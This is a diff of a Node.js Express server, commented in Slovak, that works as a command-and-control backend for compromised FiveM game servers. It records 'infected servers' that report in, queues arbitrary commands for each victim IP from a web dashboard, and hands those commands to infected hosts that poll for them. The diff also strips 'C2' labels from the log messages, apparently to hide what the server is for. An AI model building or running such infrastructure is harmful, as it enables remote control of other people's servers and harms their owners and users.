@@ -6,16 +6,16 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
-// Statické súbory
-const frontendPath = path.join(__dirname, 'frontend'); 
+// Nastavenie cesty k frontendu - Render hľadá relatívne k server.js
+const frontendPath = path.join(__dirname, 'frontend');
+
+// Servovanie statických súborov (CSS, JS, obrázky)
 app.use(express.static(frontendPath));
 
 let infectedServers = []; 
-let serverCommands = {}; // Tu sa budú ukladať príkazy čakajúce na vykonanie (podľa IP)
+let serverCommands = {}; 
 
-// --- ENDPOINTY PRE FIVEM SERVER ---
-
-// 1. Prijímanie reportu zo servera
+// Endpoint pre FiveM report
 app.post('/api/report', (req, res) => {
     const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const cleanIp = rawIp.replace('::ffff:', '').split(',')[0].trim();
@@ -33,60 +33,42 @@ app.post('/api/report', (req, res) => {
     } else { 
         infectedServers.push(newServer); 
     }
-    
     res.status(200).send({ status: "ok" });
 });
 
-// 2. FiveM server si tadiaľto sťahuje príkazy (Polling)
+// Endpoint pre sťahovanie príkazov zo strany FiveM
 app.get('/api/get-commands', (req, res) => {
     const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const cleanIp = rawIp.replace('::ffff:', '').split(',')[0].trim();
-    
-    // Ak sú pre túto IP nejaké príkazy, pošleme ich a hneď vymažeme z fronty
     const cmds = serverCommands[cleanIp] || [];
     serverCommands[cleanIp] = []; 
-    
     res.json(cmds);
 });
 
-
-// --- ENDPOINTY PRE WEB DASHBOARD ---
-
-// 3. Zoznam serverov pre hlavnú stránku
+// Zoznam pre web
 app.get('/api/list', (req, res) => {
     res.json(infectedServers);
 });
 
-// 4. Odoslanie príkazu z webu do fronty
+// Odoslanie príkazu z webu
 app.post('/api/send-command', (req, res) => {
     const { ip, command } = req.body;
-    
-    if (!ip || !command) {
-        return res.status(400).send({ error: "Chýba IP alebo príkaz" });
-    }
-
-    if (!serverCommands[ip]) {
-        serverCommands[ip] = [];
-    }
-
+    if (!ip || !command) return res.status(400).send({ error: "Chýba IP alebo príkaz" });
+    if (!serverCommands[ip]) serverCommands[ip] = [];
     serverCommands[ip].push(command);
-    console.log(`[C2] Príkaz "${command}" pridaný do fronty pre IP: ${ip}`);
-    
-    res.json({ status: "queued", command: command });
+    res.json({ status: "queued" });
 });
 
-
-// --- OBSLUHA STRÁNOK ---
-
+// --- ROUTY PRE STRÁNKY ---
 app.get('/', (req, res) => {
     res.sendFile(path.join(frontendPath, 'index.html'));
 });
 
-app.get('/manage', (req, res) => {
+app.get('/manage.html', (req, res) => {
     res.sendFile(path.join(frontendPath, 'manage.html'));
 });
 
 const PORT = process.env.PORT || 10000; 
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`C2 Server beží na porte ${PORT}`);
+    console.log(`Server beží na porte ${PORT}`);
 });
